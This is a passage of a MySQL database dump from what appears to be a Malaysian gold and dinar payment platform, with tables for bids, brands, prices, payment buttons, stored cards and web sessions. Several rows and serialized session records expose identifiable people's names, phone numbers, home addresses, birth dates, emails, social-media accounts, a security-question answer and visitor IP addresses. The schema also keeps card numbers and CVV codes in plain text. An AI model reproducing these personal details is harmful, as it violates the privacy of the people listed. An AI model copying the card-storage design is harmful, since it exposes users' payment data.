(18, 28, '', '', 1, '', '', '', '', '', '', '', '', 1),
(19, 29, '', '', 1, '', '', '', '', '', '', '', '', 1),
(20, 30, '', '', 1, '', '', '', '', '', '', '', '', 1),
(21, 31, '', '', 1, '', '', '', '', '', '', '', '', 1),
(22, 32, '', '', 1, '', '', '', '', '', '', '', '', 1),
(23, 33, '', '', 1, '', '', '', '', '', '', '', '', 1),
(24, 34, '', '', 1, '', '', '', '', '', '', '', '', 1),
(25, 35, '', '', 1, '', '', '', '', '', '', '', '', 1),
(26, 36, '', '', 1, '', '', '', '', '', '', '', '', 1),
(27, 37, '', '', 1, '', '', '', '', '', '', '', '', 1),
(28, 38, '', '', 1, '', '', '', '', '', '', '', '', 1),
(29, 39, '', '', 1, '', '', '', '', '', '', '', '', 1),
(30, 40, '', '', 1, '', '', '', '', '', '', '', '', 1),
(31, 41, '', '', 1, '', '', '', '', '', '', '', '', 1),
(32, 42, '', '', 1, '', '', '', '', '', '', '', '', 1),
(33, 43, '', '', 1, '', '', '', '', '', '', '', '', 1),
(34, 44, '', '', 1, '', '', '', '', '', '', '', '', 1),
(35, 45, '', '', 1, '', '', '', '', '', '', '', '', 1),
(36, 46, '', '', 1, '', '', '', '', '', '', '', '', 1),
(37, 47, '', '', 1, '', '', '', '', '', '', '', '', 1),
(38, 48, '', '', 1, '', '', '', '', '', '', '', '', 1),
(39, 49, '', '', 1, '', '', '', '', '', '', '', '', 1),
(40, 50, '', '', 1, '', '', '', '', '', '', '', '', 1),
(41, 51, '', '', 1, '', '', '', '', '', '', '', '', 1),
(42, 52, '', '', 1, '', '', '', '', '', '', '', '', 1),
(43, 53, '', '', 1, '', '', '', '', '', '', '', '', 1),
(44, 54, 'roslan', 'ali', 1, 'father', '-', '0199507610', 'n0 1 felda bukit bading', 'kuala terengganu', 'malaysia', '21810', 'terengganu', 1),
(45, 55, '', '', 1, '', '', '', '', '', '', '', '', 1);

-- --------------------------------------------------------

--
-- Table structure for table `bids`
--

CREATE TABLE IF NOT EXISTS `bids` (
  `bid_id` int(11) NOT NULL AUTO_INCREMENT,
  `bid_name` varchar(500) NOT NULL,
  `bid_startdate` datetime NOT NULL,
  `bid_enddate` datetime NOT NULL,
  `bid_startprice` varchar(200) NOT NULL DEFAULT '0',
  `bid_killprice` varchar(200) NOT NULL DEFAULT '0',
  `bb_id` int(11) NOT NULL,
  `bid_status` int(11) NOT NULL DEFAULT '1',
  `bid_image` varchar(500) NOT NULL,
  PRIMARY KEY (`bid_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `bid_member`
--

CREATE TABLE IF NOT EXISTS `bid_member` (
  `bm_id` int(11) NOT NULL AUTO_INCREMENT,
  `bid_id` int(11) NOT NULL,
  `me_id` int(11) NOT NULL,
  `bm_bidprice` double NOT NULL,
  `bm_biddate` datetime NOT NULL,
  `bm_status` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`bm_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `brands`
--

CREATE TABLE IF NOT EXISTS `brands` (
  `br_id` int(11) NOT NULL AUTO_INCREMENT,
  `br_code` varchar(200) NOT NULL,
  `br_name` varchar(200) NOT NULL,
  PRIMARY KEY (`br_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=8 ;

--
-- Dumping data for table `brands`
--

INSERT INTO `brands` (`br_id`, `br_code`, `br_name`) VALUES
(1, 'DP', 'DinarPal'),
(5, 'PAMP', 'PAMP'),
(6, 'KOPSYA', 'KOPSYA'),
(7, '-', 'Others');

-- --------------------------------------------------------

--
-- Table structure for table `brands_itc`
--

CREATE TABLE IF NOT EXISTS `brands_itc` (
  `bi_id` int(11) NOT NULL AUTO_INCREMENT,
  `br_id` int(11) NOT NULL,
  `itc_id` int(11) NOT NULL,
  PRIMARY KEY (`bi_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=15 ;

--
-- Dumping data for table `brands_itc`
--

INSERT INTO `brands_itc` (`bi_id`, `br_id`, `itc_id`) VALUES
(1, 1, 1),
(2, 2, 1),
(3, 3, 1),
(4, 4, 1),
(5, 1, 2),
(6, 2, 2),
(7, 3, 2),
(8, 4, 2),
(9, 1, 3),
(10, 2, 3),
(11, 3, 3),
(12, 4, 3),
(13, 5, 3),
(14, 1, 4);

-- --------------------------------------------------------

--
-- Table structure for table `brands_itc_purity`
--

CREATE TABLE IF NOT EXISTS `brands_itc_purity` (
  `bip_id` int(11) NOT NULL AUTO_INCREMENT,
  `bi_id` int(11) NOT NULL,
  `pu_id` int(11) NOT NULL,
  `bip_price` varchar(200) NOT NULL,
  `bip_rate` varchar(200) NOT NULL DEFAULT '1',
  PRIMARY KEY (`bip_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=8 ;

--
-- Dumping data for table `brands_itc_purity`
--

INSERT INTO `brands_itc_purity` (`bip_id`, `bi_id`, `pu_id`, `bip_price`, `bip_rate`) VALUES
(1, 1, 1, '131.43', '1'),
(2, 1, 2, '126.75', '1'),
(3, 1, 3, '122.51', '1'),
(4, 1, 4, '116.75', '1'),
(5, 1, 5, '111.19', '1'),
(6, 1, 6, '100.70', '1'),
(7, 2, 1, '9.35', '1');

-- --------------------------------------------------------

--
-- Table structure for table `button_api`
--

CREATE TABLE IF NOT EXISTS `button_api` (
  `bap_id` int(11) NOT NULL AUTO_INCREMENT,
  `me_id` int(11) NOT NULL,
  `bap_name` varchar(200) DEFAULT NULL,
  `bap_price` varchar(200) NOT NULL,
  `bap_delivery` varchar(200) NOT NULL,
  `bap_gst` int(11) NOT NULL,
  `bap_desc` varchar(500) NOT NULL,
  `bap_code` varchar(200) NOT NULL,
  `bap_image` varchar(200) NOT NULL,
  `bap_info_url` varchar(200) NOT NULL,
  `bap_goto_url` varchar(200) NOT NULL,
  `bap_hit` int(11) NOT NULL DEFAULT '0',
  `bap_sales` int(11) NOT NULL DEFAULT '0',
  `bap_status` int(11) DEFAULT '1',
  PRIMARY KEY (`bap_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;

--
-- Dumping data for table `button_api`
--

INSERT INTO `button_api` (`bap_id`, `me_id`, `bap_name`, `bap_price`, `bap_delivery`, `bap_gst`, `bap_desc`, `bap_code`, `bap_image`, `bap_info_url`, `bap_goto_url`, `bap_hit`, `bap_sales`, `bap_status`) VALUES
(3, 2, 'pinggan', '7.00', '', 1, '', '', '6ea3e89e53d41c686ba8fea14e4edbb2.jpg', '', 'payment/?product=AjA=', 0, 0, 1);

-- --------------------------------------------------------

--
-- Table structure for table `button_api_action`
--

CREATE TABLE IF NOT EXISTS `button_api_action` (
  `baa_id` int(11) NOT NULL AUTO_INCREMENT,
  `baa_desc` varchar(200) NOT NULL,
  PRIMARY KEY (`baa_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;

--
-- Dumping data for table `button_api_action`
--

INSERT INTO `button_api_action` (`baa_id`, `baa_desc`) VALUES
(1, 'Payment'),
(2, 'Subscription'),
(3, 'Donation');

-- --------------------------------------------------------

--
-- Table structure for table `cards`
--

CREATE TABLE IF NOT EXISTS `cards` (
  `ca_id` int(11) NOT NULL AUTO_INCREMENT,
  `me_id` int(11) NOT NULL,
  `ct_id` int(11) NOT NULL,
  `ca_name` varchar(200) DEFAULT NULL,
  `ca_number` varchar(200) DEFAULT NULL,
  `ca_cvnnumber` varchar(200) DEFAULT NULL,
  `ca_expiredmonth` varchar(200) DEFAULT NULL,
  `ca_expiredyear` varchar(200) DEFAULT NULL,
  `ca_status` int(11) NOT NULL,
  PRIMARY KEY (`ca_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=12 ;

--
-- Dumping data for table `cards`
--

INSERT INTO `cards` (`ca_id`, `me_id`, `ct_id`, `ca_name`, `ca_number`, `ca_cvnnumber`, `ca_expiredmonth`, `ca_expiredyear`, `ca_status`) VALUES
(11, 1, 1, 'ASDASDASD', '123321123321', '323', '1', '2015', 1);

-- --------------------------------------------------------

--
-- Table structure for table `cards_type`
--

CREATE TABLE IF NOT EXISTS `cards_type` (
  `ct_id` int(11) NOT NULL AUTO_INCREMENT,
  `ct_name` varchar(200) NOT NULL,
  PRIMARY KEY (`ct_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=6 ;

--
-- Dumping data for table `cards_type`
--

INSERT INTO `cards_type` (`ct_id`, `ct_name`) VALUES
(1, 'Visa'),
(2, 'Master Card'),
(3, 'American Express'),
(4, 'Discover'),
(5, 'asdasd');

-- --------------------------------------------------------

--
-- Table structure for table `ci_sessions`
--

CREATE TABLE IF NOT EXISTS `ci_sessions` (
  `session_id` varchar(40) NOT NULL DEFAULT '0',
  `ip_address` varchar(45) NOT NULL DEFAULT '0',
  `user_agent` varchar(120) NOT NULL,
  `last_activity` int(10) unsigned NOT NULL DEFAULT '0',
  `user_data` text NOT NULL,
  PRIMARY KEY (`session_id`),
  KEY `last_activity_idx` (`last_activity`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `ci_sessions`
--

INSERT INTO `ci_sessions` (`session_id`, `ip_address`, `user_agent`, `last_activity`, `user_data`) VALUES
('00312fda9ffcf9fe96aec10cf5409652', '203.106.149.139', 'Mozilla/5.0 (Linux; Android 5.1.1; KIW-L22 Build/H', 1461544932, 'a:1:{s:12:"me_id_parent";s:88:"aj6d57mcqI6GyELE5FzRQogbwy7xo1cTDO-mvXuKF7sf-LNBHgvDbJj6jVVC78cPtwHXm7JB109Bwj_eOolJTQ==";}'),
('003a37665812194a446ca2fbf27b2ef0', '123.30.175.212', 'Mozilla/5.0 (compatible; coccoc/1.0; +http://help.', 1461544852, ''),
('005d9268d68e51b6c0e6248f063683be', '180.76.15.30', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461573708, ''),
('00b0f04f0d4760403393b4001eb947c9', '1.9.100.66', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/53', 1461728471, ''),
('00faea01b52e48196c8cd71da84137c0', '175.138.178.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1461699469, 'a:1:{s:12:"me_id_parent";s:1:"1";}'),
('013e76beebb7022990e20460844db1d1', '66.249.66.55', 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/', 1461253229, ''),
('014bc4186a79d0f613ad56469f8148d7', '66.249.69.4', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461537577, ''),
('015b9521ee55db26e2ebc41427d384cc', '180.76.15.150', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461669769, ''),
('01732cf72e3df4b534a24e2cc04e87c2', '61.231.4.151', '0', 1461534490, ''),
('018a94cddcd3f49915a65483c8050285', '69.171.228.116', 'facebookexternalhit/1.1', 1461231335, ''),
('01c3c6eab35852c59be53c5664506e41', '207.46.13.142', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461832050, ''),
('021dd581d2cad5f24f10ae9c4970d338', '66.249.69.222', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461539250, ''),
('024c562d371fa49fca3a5e35c4b56230', '184.105.139.67', '0', 1461589312, ''),
('02b39d0d2a97fbeae856b7ff0182906c', '5.9.83.211', 'Mozilla/5.0 (compatible; MegaIndex.ru/2.0; +http:/', 1461160553, ''),
('02b92f8a4df5db923a6a98469d2e4bf2', '0.0.0.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1458138025, ''),
('02e654f253906c9c91f971449f2596fe', '66.102.7.133', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36', 1461634075, ''),
('032a83590f5396845cbc86fff3588277', '157.55.39.163', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461260011, ''),
('033a8935338d2fbeccf4b29600dc5353', '208.67.172.36', 'Mozilla/5.0 (X11; U; Linux x86_64;en-US;rv:1.9.2.1', 1461733651, ''),
('034d0818d0ffe04c794054143713da08', '130.193.51.30', 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://ya', 1461247728, ''),
('035150df32d3484fa855bb7dd9b60d86', '203.82.80.41', 'Mozilla/5.0 (Linux; Android 4.4.2; GT-N7100 Build/', 1461476712, ''),
('0360c8e4210ff57b3997cb5940a02c74', '123.125.71.108', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461112598, ''),
('03a448d478c9a38201e4696ed86e95db', '133.242.52.175', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1461680818, ''),
('03b07375a8f86713a7b640bdc4aa9d5b', '151.80.31.174', 'Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ah', 1461634520, ''),
('040f794bb3431a25280d4667746c8d73', '66.249.64.46', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461797550, ''),
('0413861ae69c1bc2c3869fce21d8345e', '60.54.87.69', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/53', 1461731330, ''),
('047dd100a1bba945970fd7e48c9d59ac', '66.249.69.61', 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/', 1461542016, ''),
('04b18b4978a78448e732cdac63e670a1', '183.171.25.175', 'WhatsApp/2.16.13 A', 1461766492, 'a:1:{s:12:"me_id_parent";s:8:"VmNdag==";}'),
('04cf96b330d11159fd47d4f3357cd9b1', '180.76.15.20', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461752085, ''),
('04eebb68fc075909b2bece9677238c40', '46.118.156.3', 'Mozilla/3.0 (x86 [en] Windows NT 5.1; Sun)', 1461457356, ''),
('050f2ffe1d1e08289c03c27d520afbb9', '178.137.90.202', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461430341, ''),
('0531c6452571ac2548518ce06cfe81dd', '180.76.15.147', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461734193, ''),
('057c4f33ba5264b910c5ddf6a1e29641', '173.252.90.234', 'facebookexternalhit/1.1 (+http://www.facebook.com/', 1461421899, 'a:1:{s:12:"me_id_parent";s:88:"3T4uonQ5aEV4HjxW40BAds4_92pafHe72XM_BUMQH3QRfjePt9F6Nm18xEUutXNG_GuGY6r6rY9WXSPkrNiJFw==";}'),
('059e94c38e6feec977c5c168105770c0', '78.46.50.246', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461898655, ''),
('05a8e479df8229608db93aaaed3fceb7', '78.46.50.246', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461898667, ''),
('05d97752318fe1d1418893f68705fe05', '66.249.66.69', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461867940, ''),
('063c781f85613c10a75f4bd87e3aab0f', '157.55.39.137', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461601961, ''),
('065c65896430e286f5a18963563ddee3', '66.249.69.45', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461594637, ''),
('0670fd1d8491c8005da560008882da4a', '111.221.44.11', 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z008D Build/', 1461411801, 'a:1:{s:12:"me_id_parent";s:88:"cg78vUwF5cyf5zq-8j7_Rl_uKmvE_tSAbJjgM0Zoee0RmLVv-nRi4uiaMsiGCylR-zc7uXEP9sd_8_WY4TxN0w==";}'),
('0675998ea827e10638879b2dbcd1327b', '157.55.39.159', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461803068, ''),
('068e081e63819a014a75208bae3bd6cc', '208.67.172.36', 'Mozilla/5.0 (X11; U; Linux x86_64;en-US;rv:1.9.2.1', 1461741692, ''),
('069b16bf10e4a04ff041e80b3f6c2982', '183.171.174.165', 'Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Lenov', 1461475682, 'a:1:{s:12:"me_id_parent";s:88:"cw0d9KaVH511S4JlP9m6swdO5o7kxUQlO_J3yNFMALiY6JHh0gUb5ILGXUD4hYfSMpmjrAXkRTj5pf_0jHiHhw==";}'),
('069ebeb343dc698e2459c7e271fec0a5', '178.137.90.202', 'Mozilla/4.0 (compatible; MSIE 6.0; AOL 9.0; Window', 1461188319, ''),
('06ad30878cdd1199d2a278b05f45c9d6', '178.137.90.202', 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0;', 1461743141, ''),
('06aff67037c2a1db02da3c40ad40b889', '14.192.209.171', 'Mozilla/5.0 (Linux; Android 5.0; SM-N9005 Build/LR', 1461431449, ''),
('06b2ab257bfa5da5f8caab93083b1cdf', '175.141.29.156', 'Mozilla/5.0 (Linux; Android 4.4.4; R8206 Build/KTU', 1461498286, 'a:1:{s:12:"me_id_parent";s:88:"fgCpqb3lj0jaLmsDj6ewcmcuZLoKqrVnWw3yRq0-JQ51eqcDBVyoL9E9b1w9DvbWAUIOv6veoHNxCUEgU8P68A==";}'),
('06c9d612e5e2b63900b7f2b23410afb2', '134.249.55.100', 'Mozilla/6.0 (compatible; MSIE 7.0a1; Windows NT 5.', 1461690036, ''),
('06cee869484319c20feafea82e8dff7b', '123.136.106.233', 'Mozilla/5.0 (Linux; Android 5.0.2; SM-A500F Build/', 1461408899, 'a:1:{s:15:"flash:old:error";s:158:"Password validation failure ( your choise is weak ) <br /><br />Password must include at least one CAPS!<br />Password must include at least one symbol!<br />";}'),
('0708f8bb8cbd02e71e245c9999e3d859', '180.76.15.24', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461624354, ''),
('076e1e4c8554a338f58381e4b03b0eb4', '115.134.65.141', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461736814, ''),
('07c2e9f4178212780166e50238dfb7c4', '5.248.253.133', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)', 1461930875, ''),
('07fed701cfe3c12ba0d130bf840b5c99', '66.249.64.228', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461842340, ''),
('08242e445f1ac3d05f6862436b7a297e', '66.249.69.68', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461661248, ''),
('08501d9ae288284df2fe4b78a5b69858', '113.210.62.149', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461637934, ''),
('08544c8ba86f685236047d78f91d337d', '180.76.15.135', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461462551, ''),
('0873a7b75e83865955954d9c31dae681', '113.210.54.93', 'WhatsApp/2.16.13 A', 1461231994, ''),
('08bcbebfa4a9bd6f00eb869382282ce5', '210.48.221.10', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461767305, ''),
('08f2539879b806f8819fb089a988aa68', '64.233.173.130', 'Mozilla/5.0 (Linux; Android 5.1.1; SM-N750 Build/L', 1461132184, ''),
('08f51c6431f8969f889b012461060c77', '175.139.12.57', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-G355H Build/', 1461500766, 'a:1:{s:12:"me_id_parent";s:88:"9GKJHlDCaHRYp6ZTSW4kgcb-aFPT5iXVBY6_72bIDQ_dg3qcwI9aUHkhbuDOrFq35-a9W7yhOkEBYy7UiYY6mQ==";}'),
('091175ecc747e05f8d4a3c5023ea33bc', '180.76.15.137', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461527402, ''),
('0954b61d17d2d63cb508d559f82de4c7', '180.76.15.136', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461285196, ''),
('0956c0c5540d5055132784c197297eae', '45.33.36.127', 'Mozilla/5.0 (compatible; Uptimebot/1.0; +http://ww', 1461828451, ''),
('096b3e9b5d78b9e96b7bf97c884bd4e9', '180.76.15.23', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461799695, ''),
('098de9b2174e660641e546875a7e8f6f', '178.154.189.23', 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://ya', 1461727664, ''),
('09912550084b78d0f36d0c227a6047c9', '77.75.77.11', 'Mozilla/5.0 (compatible; SeznamBot/3.2; +http://fu', 1461603430, ''),
('09b2119d98848021712ff276f47602b6', '180.76.15.147', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461730604, ''),
('09e1e4b806deff0a8aff1610b856457c', '66.249.66.187', 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/', 1461243394, ''),
('09e7afdcad8fd464a6e7f4fffc628c90', '40.77.167.27', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461464636, ''),
('09f5df1bf397a4d2efbfff7bcb56d1c6', '1.9.103.6', 'Mozilla/5.0 (Linux; Android 4.4.4; 3006 Build/KTU8', 1461234408, 'a:1:{s:12:"me_id_parent";s:88:"HvV7mdJP2jeO2p-InEJsMQqYYlDJQUUhFVDMGmO5xL_uKSoVIz5vo-Fu8FfVVJXNPhFMqJ_axXsFJu2LyIYUKw==";}'),
('0a0064e2bf4af4ca2a82e1ca61f04cf5', '13.92.241.115', 'semanticbot', 1461739126, ''),
('0a0d5717e879ad163331d4df1c590c11', '198.27.74.162', 'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help', 1461485514, 'a:1:{s:12:"me_id_parent";s:88:"RYau2uAi0VbFL9k9lRDM_DJw90st770xffqpo6us_6QCYyjuhLvJYk6i7maLXpvpQxzrGE7DgG4vJ2n-qSdPNw==";}'),
('0a1b291d6f9f3c582e70c55640d87fb4', '113.210.57.165', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/53', 1461420972, ''),
('0a3b4df0df7867f591d35c6c1791b633', '123.125.71.23', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461160468, ''),
('0a49272016a282aa153f9de69ffd226c', '208.67.172.36', 'Mozilla/5.0 (X11; U; Linux x86_64;en-US;rv:1.9.2.1', 1461737772, ''),
('0a8cea48350071b21282ccd7a7d52fe4', '78.46.50.246', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461898643, ''),
('0b02446fffd2548348141b125e27c4fe', '134.249.55.100', 'Opera/9.0 (Windows NT 5.1; U; en)', 1461188428, ''),
('0b21f2cc94079969c17c0408bbe2b0f0', '123.246.120.73', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)', 1461468313, ''),
('0b2c8ce9f42565854cff148cd9c9d415', '1.171.249.242', '0', 1461132303, ''),
('0b2f20efa05aa928522400bb643676ad', '66.249.64.228', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461827352, ''),
('0b47cbf891470c6069ba40e54fb126f5', '123.246.120.73', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)', 1461616154, ''),
('0b56f0dde163ff814188c284b7858c19', '69.30.218.234', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461936564, ''),
('0b5bf39acb65cdd8a4e2c0e110696092', '180.76.15.163', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461763265, ''),
('0b745c53dc8a5513c893b2842d203065', '184.105.139.68', '0', 1461291074, ''),
('0b7d0cab5fde80b629f6501ff3e8618e', '178.255.215.70', 'Mozilla/5.0 (compatible; Exabot/3.0; +http://www.e', 1461504687, ''),
('0b82915b713b2d609cef3e43e853b4d7', '180.76.15.23', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461936049, ''),
('0b935abcfbc5806cdc1050b5396bb4c6', '157.55.39.163', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461226261, ''),
('0be03ee8de433bde5d9cf2a9f3ca3b0c', '66.249.66.30', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461294765, ''),
('0c2421a70c319c7bfb4754fdf11dd334', '113.210.54.93', 'WhatsApp/2.16.13 A', 1461232047, 'a:2:{s:12:"me_id_parent";s:1:"0";s:15:"flash:new:error";s:33:"Opss! Invalid member unique link.";}'),
('0c2e1adb941d7876dc49e7758640c1d8', '180.76.15.158', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461932182, ''),
('0c37a71922a07820d13a16c39558391b', '66.249.64.175', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461794958, ''),
('0c48e1c02dd15efe79556a796ed4e9e2', '0.0.0.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1460011015, 'a:50:{s:5:"me_id";s:2:"17";s:8:"me_image";s:42:"6d3ac-adeq-nur---ftmk!-20150212_151603.jpg";s:12:"me_firstname";s:9:"Nur Umira";s:11:"me_lastname";s:7:"Mustafa";s:11:"me_username";s:3:"nur";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:3:"nur";s:14:"me_unique_link";s:32:"b55178b011bfb206965f2638d0f87047";s:11:"me_address1";s:44:"J-1-14, BLOK J, PANGSAPURI TTU3, JALAN TU61.";s:8:"me_city1";s:10:"AYER KEROH";s:9:"me_state1";s:6:"MELAKA";s:12:"me_postcode1";s:5:"75450";s:11:"me_country1";s:8:"MALAYSIA";s:11:"me_address2";s:28:"91, JALAN KERAI, SG. RETANG.";s:8:"me_city2";s:8:"JERANTUT";s:9:"me_state2";s:6:"PAHANG";s:12:"me_postcode2";s:5:"27000";s:11:"me_country2";s:8:"MALAYSIA";s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";s:10:"0136420142";s:13:"me_birth_date";s:10:"1993-05-18";s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:33:"https://www.facebook.com/nurumira";s:10:"me_twitter";s:28:"https://twitter.com/nurumira";s:12:"me_instagram";s:29:"http://instagram.com/nurumira";s:13:"me_googleplus";s:30:"http://googleplus.com/nurumira";s:14:"me_whatsapp_no";s:10:"0199737579";s:11:"me_telegram";s:1:"-";s:9:"me_wechat";s:1:"-";s:8:"me_email";s:18:"nurumira@gmail.com";s:16:"me_register_date";s:19:"2015-04-27 03:12:49";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-07T07:18:10+02:00";s:12:"me_magic_num";s:32:"69c0e639c71a34bb6b710f043138f7f8";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";s:0:"";s:10:"me_reg_num";s:0:"";s:15:"me_company_doc1";s:0:"";s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";s:0:"";s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"2";s:9:"logged_in";b:1;}'),
('0c7a81dbe8b25d5554953f1bf3473520', '66.249.75.149', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461550688, ''),
('0d37850d1fba99ea94d19c420fb355c0', '141.8.132.104', 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://ya', 1461485857, ''),
('0d4556305ffe0c43f6b6f73de7a30ed4', '180.76.15.145', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461512400, ''),
('0d842f3a949bddb48aa72a60ae4b4ef2', '192.99.10.110', 'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help', 1461485400, 'a:1:{s:12:"me_id_parent";s:88:"Pt7NXbDFuGJ10bJ_l0Su2WzneOnYhETM_H09IpkM-BnxgdQMTR_XRGcxejMRrtaxHCQxx8Ja8Z5ETImTc1w5Sw==";}'),
('0d8d03cb600b3fbcec9bf92e4777684b', '111.221.44.11', 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z008D Build/', 1461429027, 'a:51:{s:5:"me_id";s:2:"34";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:6:"Baem84";s:11:"me_lastname";s:6:"Baem84";s:11:"me_username";s:6:"Baem84";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:6:"Baem84";s:14:"me_unique_link";s:32:"2dec95aa1b89d819984d7961b8820c63";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";N;s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";N;s:10:"me_twitter";N;s:12:"me_instagram";N;s:13:"me_googleplus";N;s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:26:"ibrahimabdhalim8@gmail.com";s:16:"me_register_date";s:19:"2016-04-24 00:21:33";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";N;s:12:"me_magic_num";s:32:"f74f305ff127ca02f92f2a1f62c2aeae";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"0";s:9:"msg_login";s:153:"Thank You for choosing Dinarpal for your platform <br/>Please fill in all your personal detail<br />and deposit your money for your account 